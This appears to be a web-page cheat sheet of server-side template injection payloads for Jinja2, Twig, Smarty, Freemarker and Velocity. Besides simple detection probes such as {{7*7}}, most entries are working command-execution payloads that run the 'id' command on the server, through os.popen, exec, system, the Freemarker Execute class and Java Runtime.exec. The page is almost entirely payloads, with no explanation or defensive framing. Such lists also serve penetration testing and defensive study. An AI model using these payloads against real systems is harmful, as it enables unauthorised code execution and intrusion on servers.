---
layout: default
title: Template Injection Payloads
---

# 📝 Template Injection Payloads

## Jinja2 (Python)
```
{{7*7}}
{{config}}
{{''.__class__.__mro__[2].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

## Twig (PHP)
```
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

## Smarty (PHP)
```
{$smarty.version}
{php}echo `id`;{/php}
{literal}{php}echo `id`;{/php}{/literal}
```

## Freemarker (Java)
```
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
${"freemarker.template.utility.Execute"?new()("id")}
```

## Velocity (Java)
```
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
```